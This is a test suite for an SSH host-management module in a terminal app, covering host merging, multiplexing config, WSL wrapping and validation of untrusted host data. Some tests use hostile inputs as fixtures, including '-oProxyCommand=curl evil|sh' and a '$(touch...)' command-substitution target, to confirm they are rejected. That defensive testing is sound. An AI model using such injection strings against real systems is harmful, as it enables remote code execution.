import { execFileSync, spawnSync } from "node:child_process"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { afterEach, beforeEach, describe, expect, it } from "vitest"
import type { RemoteRef } from "../src/types"
import { defaultSettings, type SshSettings } from "../src/settings/schema"
import {
  buildSshSpawn,
  controlDir,
  controlPathFits,
  hostDetail,
  buildSshProbe,
  isSafeControlDir,
  isUsableDir,
  mergeHosts,
  muxConfigText,
  sshAcceptsInclude,
  systemConfigCandidates,
  userManagesMux,
  trustedRemote,
  WSL_SSH_SCRIPT,
  type MergeInput,
  type SpawnContext,
} from "./ssh-hosts"
import type { SshHost } from "../src/types"

const ssh = (over: Partial<SshSettings> = {}): SshSettings => ({ ...defaultSettings.ssh, ...over })
// Windows by default, so WSL hosts are listed; tests override platform where it matters.
const merge = (
  i: Omit<MergeInput, "platform"> & { platform?: NodeJS.Platform },
  o?: { all?: boolean },
) => mergeHosts({ platform: "win32", ...i }, o)

describe("hostDetail", () => {
  it("formats user@hostname:port from the parts that are set", () => {
    expect(hostDetail({ alias: "a", hostName: "h", user: "u", port: "2222" })).toBe("u@h:2222")
    expect(hostDetail({ alias: "a", hostName: "h" })).toBe("h")
    expect(hostDetail({ alias: "a", hostName: "h", port: "2222" })).toBe("h:2222")
  })

  it("hides the default port", () => {
    expect(hostDetail({ alias: "a", hostName: "h", port: "22" })).toBe("h")
  })

  it("uses the alias as host when only User is set, and nothing when neither is", () => {
    expect(hostDetail({ alias: "box", user: "u" })).toBe("u@box")
    expect(hostDetail({ alias: "box" })).toBeUndefined()
    expect(hostDetail({ alias: "box", port: "2200" })).toBe("box:2200")
    expect(hostDetail({ alias: "box", port: "22" })).toBeUndefined()
  })
})

describe("mergeHosts", () => {
  it("builds config hosts with stable ids, env and detail", () => {
    const hosts = merge({
      native: [{ alias: "web", hostName: "10.0.0.1", user: "me" }, { alias: "db" }],
      wsl: [],
      settings: ssh(),
    })
    expect(hosts).toEqual([
      {
        hostId: "native:web",
        label: "web",
        target: "web",
        env: "native",
        source: "config",
        detail: "me@10.0.0.1",
      },
      { hostId: "native:db", label: "db", target: "db", env: "native", source: "config" },
    ])
  })

  it("keeps the same alias separately per environment", () => {
    const hosts = merge({
      native: [{ alias: "gpu" }],
      wsl: [
        ["Ubuntu", [{ alias: "gpu" }]],
        ["Debian", [{ alias: "gpu" }]],
      ],
      settings: ssh(),
    })
    expect(hosts.map((h) => [h.hostId, h.env])).toEqual([
      ["native:gpu", "native"],
      ["wsl:Ubuntu:gpu", "wsl:Ubuntu"],
      ["wsl:Debian:gpu", "wsl:Debian"],
    ])
  })

  it("appends settings hosts with their args and env", () => {
    const hosts = merge({
      native: [{ alias: "web" }],
      wsl: [],
      settings: ssh({
        hosts: [
          { name: "gpu box", target: "ubuntu@10.0.0.12", args: ["-p", "2222"], env: "native" },
          { name: "plain", target: "plain", args: [], env: "wsl:Ubuntu" },
        ],
      }),
    })
    expect(hosts.slice(1)).toEqual([
      {
        hostId: "settings:gpu box",
        label: "gpu box",
        target: "ubuntu@10.0.0.12",
        env: "native",
        source: "settings",
        extraArgs: ["-p", "2222"],
        detail: "ubuntu@10.0.0.12",
      },
      {
        hostId: "settings:plain",
        label: "plain",
        target: "plain",
        env: "wsl:Ubuntu",
        source: "settings",
      },
    ])
  })

  it("copies settings args (the host list never aliases the settings object)", () => {
    const args = ["-p", "2222"]
    const settings = ssh({ hosts: [{ name: "x", target: "x", args, env: "native" }] })
    const [h] = merge({ native: [], wsl: [], settings })
    expect(h!.extraArgs).toEqual(args)
    expect(h!.extraArgs).not.toBe(args)
  })

  it("filters hidden aliases and names in every source", () => {
    const hosts = merge({
      native: [{ alias: "github.com" }, { alias: "keep" }],
      wsl: [["Ubuntu", [{ alias: "github.com" }]]],
      settings: ssh({
        hidden: ["github.com", "secret"],
        hosts: [{ name: "secret", target: "s", args: [], env: "native" }],
      }),
    })
    expect(hosts.map((h) => h.hostId)).toEqual(["native:keep"])
  })

  it("lists only settings hosts when fromSshConfig is off", () => {
    const hosts = merge({
      native: [{ alias: "web" }],
      wsl: [["Ubuntu", [{ alias: "w" }]]],
      settings: ssh({
        fromSshConfig: false,
        hosts: [{ name: "x", target: "x", args: [], env: "native" }],
      }),
    })
    expect(hosts.map((h) => h.hostId)).toEqual(["settings:x"])
  })

  it("skips config aliases that aren't safe ssh destinations", () => {
    const hosts = merge({
      native: [{ alias: "my box" }, { alias: "-oProxyCommand=x" }, { alias: "ok" }],
      wsl: [],
      settings: ssh(),
    })
    expect(hosts.map((h) => h.hostId)).toEqual(["native:ok"])
  })

  it("skips a WSL distro whose name isn't a valid env", () => {
    const hosts = merge({ native: [], wsl: [["bad name", [{ alias: "a" }]]], settings: ssh() })
    expect(hosts).toEqual([])
  })

  it("hides WSL hosts (config and settings) off Windows", () => {
    const input = {
      native: [{ alias: "web" }],
      wsl: [["Ubuntu", [{ alias: "w" }]]] as MergeInput["wsl"],
      settings: ssh({ hosts: [{ name: "s", target: "s", args: [], env: "wsl:Ubuntu" }] }),
    }
    expect(merge({ ...input, platform: "darwin" }).map((h) => h.hostId)).toEqual(["native:web"])
    expect(merge({ ...input, platform: "linux" }).map((h) => h.hostId)).toEqual(["native:web"])
    expect(merge(input).map((h) => h.hostId)).toEqual(["native:web", "wsl:Ubuntu:w", "settings:s"])
  })

  it("keeps hidden hosts and config hosts with `all` (the trust list)", () => {
    const settings = ssh({
      fromSshConfig: false,
      hidden: ["web", "s"],
      hosts: [{ name: "s", target: "s", args: ["-p", "2222"], env: "native" }],
    })
    expect(merge({ native: [{ alias: "web" }], wsl: [], settings })).toEqual([])
    expect(
      merge({ native: [{ alias: "web" }], wsl: [], settings }, { all: true }).map((h) => h.hostId),
    ).toEqual(["native:web", "settings:s"])
  })

  it("matches hidden entries case-insensitively", () => {
    const hosts = merge({
      native: [{ alias: "github.com" }, { alias: "keep" }],
      wsl: [],
      settings: ssh({
        hidden: ["GitHub.com", "SECRET"],
        hosts: [{ name: "secret", target: "s", args: [], env: "native" }],
      }),
    })
    expect(hosts.map((h) => h.hostId)).toEqual(["native:keep"])
  })

  it("never returns duplicate ids", () => {
    const hosts = merge({ native: [{ alias: "a" }, { alias: "a" }], wsl: [], settings: ssh() })
    expect(hosts.map((h) => h.hostId)).toEqual(["native:a"])
  })

  it("returns [] for nothing", () => {
    expect(merge({ native: [], wsl: [], settings: ssh() })).toEqual([])
  })
})

describe("control dir", () => {
  it("fits a normal home under the socket limit", () => {
    expect(controlPathFits("/Users/someone/.config/smterm/cm")).toBe(true)
    expect(controlDir("/Users/someone", 501)).toBe("/Users/someone/.config/smterm/cm")
  })

  it("falls back to /tmp/smterm-<uid> for a long home", () => {
    const home = "/Users/" + "x".repeat(40)
    expect(controlPathFits(path.posix.join(home, ".config/smterm/cm"))).toBe(false)
    expect(controlDir(home, 501)).toBe("/tmp/smterm-501")
    expect(controlPathFits("/tmp/smterm-501")).toBe(true)
  })

  it("falls back for a home with spaces or shell characters (ProxyJump pastes -F unquoted)", () => {
    for (const home of ["/Users/Jane Doe", "/home/a$b", "/home/100%", "/home/a'b", "/home/é"]) {
      expect(controlDir(home, 501)).toBe("/tmp/smterm-501")
    }
    expect(isUsableDir("/Users/jane.doe+x@corp/.config/smterm/cm")).toBe(true)
  })

  it("counts bytes, not characters", () => {
    // 45 characters but 93 bytes: fits if counted in chars, not in bytes
    const home = "/" + "é".repeat(4) + "文".repeat(22)
    const dir = path.posix.join(home, ".config/smterm/cm")
    expect(dir.length + 58).toBeLessThanOrEqual(103)
    expect(controlPathFits(dir)).toBe(false)
  })

  it("accepts exactly the limit and rejects one byte more", () => {
    const at = "/" + "a".repeat(103 - 58 - 1)
    expect(controlPathFits(at)).toBe(true)
    expect(controlPathFits(at + "a")).toBe(false)
  })
})

describe("isSafeControlDir", () => {
  const ok = { isDirectory: true, isSymbolicLink: false, uid: 501, mode: 0o40700 }

  it("accepts a private dir we own", () => {
    expect(isSafeControlDir(ok, 501)).toBe(true)
  })

  it("rejects someone else's dir, symlinks, files, and group/world access", () => {
    expect(isSafeControlDir({ ...ok, uid: 0 }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, isSymbolicLink: true }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, isDirectory: false }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, mode: 0o40750 }, 501)).toBe(false)
    expect(isSafeControlDir({ ...ok, mode: 0o40701 }, 501)).toBe(false)
  })
})

describe("sshAcceptsInclude", () => {
  const ok = { isFile: true, uid: 0, mode: 0o100644 }

  it("accepts a missing file, a root-owned one, and one we own", () => {
    expect(sshAcceptsInclude(null, 501)).toBe(true)
    expect(sshAcceptsInclude(ok, 501)).toBe(true)
    expect(sshAcceptsInclude({ ...ok, uid: 501, mode: 0o100600 }, 501)).toBe(true)
  })

  it("rejects what ssh refuses under -F: others' files, group/world-writable, non-files", () => {
    expect(sshAcceptsInclude({ ...ok, uid: 1000 }, 501)).toBe(false)
    expect(sshAcceptsInclude({ ...ok, mode: 0o100664 }, 501)).toBe(false)
    expect(sshAcceptsInclude({ ...ok, mode: 0o100646 }, 501)).toBe(false)
    expect(sshAcceptsInclude({ ...ok, isFile: false }, 501)).toBe(false)
  })
})

describe("systemConfigCandidates", () => {
  it("uses /etc/ssh for the system ssh", () => {
    expect(systemConfigCandidates("/usr/bin/ssh")).toEqual(["/etc/ssh/ssh_config"])
    expect(systemConfigCandidates("/bin/ssh")).toEqual(["/etc/ssh/ssh_config"])
  })

  it("tries <prefix>/etc first for Homebrew, /usr/local or Nix builds", () => {
    expect(systemConfigCandidates("/opt/homebrew/bin/ssh")).toEqual([
      "/opt/homebrew/etc/ssh/ssh_config",
      "/etc/ssh/ssh_config",
    ])
    expect(systemConfigCandidates("/usr/local/bin/ssh")[0]).toBe("/usr/local/etc/ssh/ssh_config")
    expect(systemConfigCandidates("/nix/store/abc-openssh/bin/ssh")[0]).toBe(
      "/nix/store/abc-openssh/etc/ssh/ssh_config",
    )
  })

  it("falls back to /etc/ssh for a bare command name", () => {
    expect(systemConfigCandidates("ssh")).toEqual(["/etc/ssh/ssh_config"])
  })
})

describe("userManagesMux", () => {
  it("is true for a ControlPath or an active ControlMaster", () => {
    expect(userManagesMux("user me\ncontrolmaster false\ncontrolpath /x/cm-abc\n")).toBe(true)
    for (const v of ["auto", "yes", "ask", "autoask", "AUTO"]) {
      expect(userManagesMux(`controlmaster ${v}\ncontrolpersist no\n`)).toBe(true)
    }
  })

  it("is false when ssh left multiplexing unset (or explicitly off)", () => {
    expect(userManagesMux("user me\ncontrolmaster false\ncontrolpersist no\n")).toBe(false)
    expect(userManagesMux("")).toBe(false)
    expect(userManagesMux("controlmasterx auto\n")).toBe(false)
  })
})

describe("buildSshProbe", () => {
  it("runs ssh -G with the host's own args, target after --", () => {
    const r: RemoteRef = {
      hostId: "x",
      label: "x",
      target: "web",
      env: "native",
      extraArgs: ["-p", "1"],
    }
    expect(buildSshProbe(r, { sshPath: "ssh" })).toEqual({
      file: "ssh",
      args: ["-p", "1", "-G", "--", "web"],
    })
  })
})

describe("muxConfigText", () => {
  it("includes the user's then the system's config before our Host * defaults", () => {
    const text = muxConfigText("/home/me/.config/smterm/cm", { system: "/etc/ssh/ssh_config" })!
    const lines = text.split("\n").filter((l) => l && !l.startsWith("#"))
    expect(lines).toEqual([
      "Include ~/.ssh/config",
      "Include /etc/ssh/ssh_config",
      "Host *",
      "  ControlMaster auto",
      "  ControlPath /home/me/.config/smterm/cm/%C",
      "  ControlPersist 10m",
    ])
  })

  it("uses the given system config path", () => {
    expect(
      muxConfigText("/tmp/smterm-1", { system: "/opt/homebrew/etc/ssh/ssh_config" }),
    ).toContain("Include /opt/homebrew/etc/ssh/ssh_config")
  })

  it("returns null for a dir that isn't short and shell-safe", () => {
    for (const d of [
      "/Users/Jane Doe/cm",
      '/home/"q"',
      "/home/a\\b",
      "/home/${X}",
      "/home/100%",
      "/" + "x".repeat(60),
    ]) {
      expect(muxConfigText(d, { system: "/etc/ssh/ssh_config" })).toBeNull()
    }
  })
})

describe("buildSshSpawn", () => {
  const remote: RemoteRef = { hostId: "native:web", label: "web", target: "web", env: "native" }
  const mac: SpawnContext = {
    platform: "darwin",
    sshPath: "ssh",
    muxConfig: "/u/.config/smterm/cm/ssh_config",
    reuse: true,
  }
  const win: SpawnContext = {
    platform: "win32",
    sshPath: "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
    muxConfig: null,
    reuse: true,
  }

  it("runs ssh with our -F wrapper on macOS/Linux, then -t -- target", () => {
    expect(buildSshSpawn(remote, mac)).toEqual({
      file: "ssh",
      args: ["-F", "/u/.config/smterm/cm/ssh_config", "-t", "--", "web"],
    })
    expect(buildSshSpawn(remote, { ...mac, platform: "linux" })!.args).toContain("-F")
  })

  it("runs plain ssh when reuse is off or no verified wrapper exists", () => {
    expect(buildSshSpawn(remote, { ...mac, reuse: false })!.args).toEqual(["-t", "--", "web"])
    expect(buildSshSpawn(remote, { ...mac, muxConfig: null })!.args).toEqual(["-t", "--", "web"])
  })

  it("never uses the wrapper with Windows ssh.exe", () => {
    expect(buildSshSpawn(remote, { ...win, muxConfig: "C:\\x" })).toEqual({
      file: "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
      args: ["-t", "--", "web"],
    })
  })

  it("puts settings args before `--` and the target after it", () => {
    const r = { ...remote, target: "ubuntu@10.0.0.12", extraArgs: ["-p", "2222", "-A"] }
    const args = buildSshSpawn(r, { ...mac, reuse: false })!.args
    expect(args).toEqual(["-p", "2222", "-A", "-t", "--", "ubuntu@10.0.0.12"])
  })

  it("keeps a hostile-looking target after `--` so ssh can't read it as an option", () => {
    const args = buildSshSpawn({ ...remote, target: "-oProxyCommand=evil" }, mac)!.args
    expect(args.indexOf("--")).toBeLessThan(args.indexOf("-oProxyCommand=evil"))
    expect(args.at(-1)).toBe("-oProxyCommand=evil")
  })

  it("leaves everything to the host's args when they set multiplexing or a config file", () => {
    for (const extraArgs of [
      ["-o", "ControlMaster=no"],
      ["-S", "/tmp/cm"],
      ["-M"],
      ["-oControlPath=/x/%C"],
      ["-F", "/my/config"],
    ]) {
      const args = buildSshSpawn({ ...remote, extraArgs }, mac)!.args
      expect(args).toEqual([...extraArgs, "-t", "--", "web"])
      const wslArgs = buildSshSpawn({ ...remote, env: "wsl:Ubuntu", extraArgs }, win)!.args
      expect(wslArgs).not.toContain(WSL_SSH_SCRIPT)
    }
  })

  it("runs a WSL host through the distro's ssh, with the in-distro wrapper script", () => {
    const r: RemoteRef = { ...remote, hostId: "wsl:Ubuntu:web", env: "wsl:Ubuntu" }
    // Target first, then the user's args.
    expect(buildSshSpawn({ ...r, extraArgs: ["-A"] }, win)).toEqual({
      file: "wsl.exe",
      args: [
        "-d",
        "Ubuntu",
        "--cd",
        "~",
        "-e",
        "sh",
        "-c",
        WSL_SSH_SCRIPT,
        "smterm-ssh",
        "web",
        "-A",
      ],
    })
  })

  it("runs a WSL host with plain ssh when reuse is off", () => {
    const r: RemoteRef = { ...remote, env: "wsl:Ubuntu", extraArgs: ["-p", "1"] }
    expect(buildSshSpawn(r, { ...win, reuse: false })).toEqual({
      file: "wsl.exe",
      args: ["-d", "Ubuntu", "--cd", "~", "-e", "ssh", "-p", "1", "-t", "--", "web"],
    })
  })

  it("never appends WSL shell-integration args", () => {
    const args = buildSshSpawn({ ...remote, env: "wsl:Ubuntu" }, win)!.args
    expect(args).not.toContain("--rcfile")
    expect(args).not.toContain("--") // the script adds ssh's own `--` in the distro
  })

  it("returns null for a WSL host off Windows, or a malformed env", () => {
    expect(buildSshSpawn({ ...remote, env: "wsl:Ubuntu" }, mac)).toBeNull()
    expect(buildSshSpawn({ ...remote, env: "bogus" as RemoteRef["env"] }, mac)).toBeNull()
  })
})

const hasSh = spawnSync("sh", ["-c", "true"]).status === 0
const sshBin = spawnSync("ssh", ["-V"]).status === 0

// The wrapper's whole point: with real OpenSSH, the user's own settings (anywhere, incl.
// Match exec and the system file) beat our Host * defaults; unset ones get ours.
describe.runIf(sshBin && process.platform !== "win32")("muxConfigText with real ssh -G", () => {
  let dir: string
  beforeEach(() => {
    dir = fs.mkdtempSync("/tmp/sg-")
  })
  afterEach(() => fs.rmSync(dir, { recursive: true, force: true }))

  it("lets the user's config win and fills in only what it leaves unset", () => {
    const user = path.join(dir, "user")
    const sys = path.join(dir, "sys")
    fs.writeFileSync(
      user,
      [
        "Host legacy",
        "  ControlMaster no",
        'Match exec "true" originalhost matched',
        "  ControlPath /tmp/theirs/%C",
        "  ControlMaster auto",
        "Host trailing",
        "  User tb",
        "",
      ].join("\n"),
    )
    fs.writeFileSync(sys, "Host sysoff\n  ControlMaster no\n")
    const cfg = path.join(dir, "ssh_config")
    fs.writeFileSync(cfg, muxConfigText("/tmp/ours", { user, system: sys })!)
    const g = (host: string) => {
      const out = execFileSync("ssh", ["-G", "-F", cfg, "--", host], { encoding: "utf8" })
      const get = (k: string) => new RegExp(`^${k} (.*)$`, "m").exec(out)?.[1]
      return { master: get("controlmaster"), path: get("controlpath"), user: get("user") }
    }
    expect(g("plain")).toMatchObject({ master: "auto" })
    expect(g("plain").path).toMatch(/^\/tmp\/ours\//)
    expect(g("legacy").master).toBe("false")
    expect(g("sysoff").master).toBe("false")
    expect(g("matched").path).toMatch(/^\/tmp\/theirs\//)
    // An included file ending inside a Host block doesn't swallow our Host *.
    expect(g("trailing")).toMatchObject({ master: "auto", user: "tb" })
  })

  it("probing without the wrapper tells a user-managed host from an unset one", () => {
    const user = path.join(dir, "user")
    fs.writeFileSync(
      user,
      "Host mine\n  ControlMaster auto\n  ControlPath /tmp/mine/%C\nHost off\n  ControlMaster no\n",
    )
    const g = (host: string) =>
      execFileSync("ssh", ["-G", "-F", user, "--", host], { encoding: "utf8" })
    expect(userManagesMux(g("mine"))).toBe(true)
    expect(userManagesMux(g("plain"))).toBe(false)
    expect(userManagesMux(g("off"))).toBe(false) // explicit no: the wrapper's first-wins keeps it
  })

  it("refuses a group-writable Include under -F (why the system config is checked first)", () => {
    const inc = path.join(dir, "inc")
    fs.writeFileSync(inc, "Host x\n")
    fs.chmodSync(inc, 0o664)
    const top = path.join(dir, "top")
    fs.writeFileSync(top, `Include ${inc}\n`)
    const r = spawnSync("ssh", ["-G", "-F", top, "--", "x"], { encoding: "utf8" })
    expect(r.status).not.toBe(0)
    expect(r.stderr).toMatch(/permissions/i)
  })
})

// Runs the WSL script with a real POSIX sh and a stub `ssh`: `-G` prints $G_OUT (ssh's
// resolved config), anything else prints its argv one per line — so we test the actual
// shell logic (dir choice, probe gate, 0700, atomic wrapper, args).
describe.runIf(hasSh && process.platform !== "win32")("WSL_SSH_SCRIPT (real sh)", () => {
  let tmp: string
  let bin: string
  beforeEach(() => {
    // Directly under /tmp: an OS temp dir like /var/folders/… is long enough to trip the
    // socket-length fallback we test separately.
    tmp = fs.mkdtempSync("/tmp/sw-")
    bin = path.join(tmp, "bin")
    fs.mkdirSync(bin)
    fs.writeFileSync(
      path.join(bin, "ssh"),
      [
        "#!/bin/sh",
        'for a in "$@"; do [ "$a" = "-G" ] && { printf "%s" "${G_OUT-controlmaster false}"; exit ${G_EXIT-0}; }; done',
        'for a in "$@"; do printf "%s\\n" "$a"; done',
        "",
      ].join("\n"),
      { mode: 0o755 },
    )
  })
  afterEach(() => fs.rmSync(tmp, { recursive: true, force: true }))

  // Same argv shape buildSshSpawn produces: target first, then the user's extra args.
  const run = (
    home: string,
    target: string,
    extra: string[] = [],
    env: Record<string, string> = {},
  ) =>
    execFileSync("sh", ["-c", WSL_SSH_SCRIPT, "smterm-ssh", target, ...extra], {
      env: { PATH: `${bin}:/usr/bin:/bin`, HOME: home, ...env },
      encoding: "utf8",
    })
      .split("\n")
      .filter((l, i, all) => i < all.length - 1 || l !== "")

  const mkHome = (name = "h") => {
    const home = path.join(tmp, name)
    fs.mkdirSync(home)
    return home
  }
  const plain = (...extra: string[]) => [...extra, "-t", "--", "web"]

  it("writes the same wrapper as the native path (0700 dir) and runs ssh -F with it", () => {
    const home = mkHome()
    const out = run(home, "web", ["-A"])
    const dir = path.join(home, ".config/smterm/cm")
    expect(out).toEqual(["-F", `${dir}/ssh_config`, "-A", "-t", "--", "web"])
    expect(fs.statSync(dir).mode & 0o777).toBe(0o700)
    expect(fs.readFileSync(`${dir}/ssh_config`, "utf8")).toBe(
      muxConfigText(dir, { system: "/etc/ssh/ssh_config" }),
    )
    expect(fs.readdirSync(dir)).toEqual(["ssh_config"]) // no temp file left behind
  })

  it("stays out when ssh -G shows the user's own multiplexing", () => {
    const outputs = [
      "controlmaster auto\ncontrolpath /x/%C\n",
      "controlpath /x/%C\n",
      "controlmaster yes\n",
    ]
    outputs.forEach((g, i) => {
      expect(run(mkHome(`h${i}`), "web", ["-A"], { G_OUT: g })).toEqual(plain("-A"))
    })
  })

  it("runs plain ssh when the probe fails", () => {
    expect(run(mkHome(), "web", [], { G_EXIT: "255" })).toEqual(plain())
  })

  it("passes arguments with spaces and quotes through intact", () => {
    const out = run(mkHome(), 'we"b', ["-o", "SetEnv=A=b c"])
    expect(out.slice(2)).toEqual(["-o", "SetEnv=A=b c", "-t", "--", 'we"b'])
  })

  it("keeps a target that looks like an option after `--`", () => {
    expect(run(mkHome(), "-oProxyCommand=x").slice(-2)).toEqual(["--", "-oProxyCommand=x"])
  })

  it("accepts a symlinked ~/.ssh/config (dotfile managers) — ssh checks the target itself", () => {
    const home = mkHome()
    fs.mkdirSync(path.join(home, ".ssh"))
    fs.writeFileSync(path.join(tmp, "real-config"), "Host a\n", { mode: 0o600 })
    fs.symlinkSync(path.join(tmp, "real-config"), path.join(home, ".ssh/config"))
    expect(run(home, "web")[0]).toBe("-F")
  })

  it("falls back to plain ssh when the dir is a symlink, and never writes through it", () => {
    const home = mkHome()
    fs.mkdirSync(path.join(home, ".config/smterm"), { recursive: true })
    const victim = path.join(tmp, "victim")
    fs.mkdirSync(victim)
    fs.chmodSync(victim, 0o755)
    fs.symlinkSync(victim, path.join(home, ".config/smterm/cm"))
    expect(run(home, "web")).toEqual(plain())
    expect(fs.statSync(victim).mode & 0o777).toBe(0o755)
    expect(fs.readdirSync(victim)).toEqual([])
  })

  it("moves a home with spaces or shell characters to /tmp/smterm-<uid>", () => {
    const uid = os.userInfo().uid
    const fallback = `/tmp/smterm-${uid}`
    const existed = fs.existsSync(fallback)
    try {
      for (const name of ["Jane Doe", "100%", 'a"b', "a$b", "a\\b", "x${Y}", "é".repeat(10)]) {
        const out = run(mkHome(name), "web")
        if (out[0] === "-F") expect(out[1]).toBe(`${fallback}/ssh_config`)
        else expect(out).toEqual(plain()) // exists but isn't ours/private
      }
      const out = run("/" + "x".repeat(60), "web")
      if (out[0] === "-F") expect(out[1]).toBe(`${fallback}/ssh_config`)
    } finally {
      if (!existed) fs.rmSync(fallback, { recursive: true, force: true })
    }
  })

  it("falls back to plain ssh when the dir can't be created", () => {
    const home = mkHome("ro")
    fs.writeFileSync(path.join(home, ".config"), "a file, not a dir")
    expect(run(home, "web")).toEqual(plain())
  })
})

describe("trustedRemote", () => {
  const listed: SshHost[] = [
    { hostId: "native:web", label: "web", target: "web", env: "native", source: "config" },
    {
      hostId: "settings:gpu",
      label: "gpu",
      target: "ubuntu@10.0.0.12",
      env: "native",
      source: "settings",
      extraArgs: ["-p", "2222"],
    },
  ]

  it("uses main's own copy of a listed host, ignoring what the renderer sent", () => {
    const sent = {
      hostId: "settings:gpu",
      label: "x",
      target: "evil",
      env: "wsl:Other",
      extraArgs: ["-oProxyCommand=curl evil|sh"],
    }
    expect(trustedRemote(sent, listed)).toEqual({
      hostId: "settings:gpu",
      label: "gpu",
      target: "ubuntu@10.0.0.12",
      env: "native",
      extraArgs: ["-p", "2222"],
    })
  })

  it("never lets a config host gain extra args", () => {
    const sent = {
      hostId: "native:web",
      label: "web",
      target: "web",
      env: "native",
      extraArgs: ["-v"],
    }
    expect(trustedRemote(sent, listed)).toEqual({
      hostId: "native:web",
      label: "web",
      target: "web",
      env: "native",
    })
  })

  it("copies a listed host's args (no aliasing)", () => {
    expect(trustedRemote({ hostId: "settings:gpu" }, listed)!.extraArgs).not.toBe(
      listed[1]!.extraArgs,
    )
  })

  it("refuses a settings host that's no longer in settings (its args are unknown)", () => {
    const sent = {
      hostId: "settings:gone",
      label: "gone",
      target: "ubuntu@10.0.0.12",
      env: "native",
    }
    expect(trustedRemote(sent, listed)).toBeNull()
  })

  it("keeps an unlisted config host usable with its own validated target and no extra args", () => {
    const sent = {
      hostId: "native:gone",
      label: "gone",
      target: "gone.example",
      env: "native",
      extraArgs: ["-A"],
    }
    expect(trustedRemote(sent, listed)).toEqual({
      hostId: "native:gone",
      label: "gone",
      target: "gone.example",
      env: "native",
    })
  })

  it("rejects an unlisted host with an unsafe target or env", () => {
    for (const bad of [
      { hostId: "x", target: "-oProxyCommand=x", env: "native" },
      { hostId: "x", target: "a b", env: "native" },
      { hostId: "x", target: "$(touch${IFS}/tmp/pwn)@host", env: "native" },
      { hostId: "x", target: "a;b", env: "native" },
      { hostId: "x", target: "ssh://me@web:2222", env: "native" },
      { hostId: "x", target: "ok", env: "wsl:bad name" },
      { hostId: "x", target: "ok" },
    ]) {
      expect(trustedRemote(bad, listed)).toBeNull()
    }
  })

  it("rejects non-objects and a missing, oversized or control-character hostId", () => {
    for (const bad of [
      null,
      undefined,
      "native:web",
      3,
      {},
      { hostId: "" },
      { hostId: 1 },
      { hostId: "x".repeat(301), target: "t", env: "native" },
      { hostId: "a\u001b[2J", target: "t", env: "native" },
    ]) {
      expect(trustedRemote(bad, listed)).toBeNull()
    }
  })

  it("falls back to the target as label and caps a long label", () => {
    const t = (label?: string) =>
      trustedRemote({ hostId: "x", target: "t", env: "native", label }, [])!.label
    expect(t()).toBe("t")
    expect(t("  ")).toBe("t")
    expect(t("a\nb")).toBe("t")
    expect(t("y".repeat(500))).toHaveLength(200)
  })
})
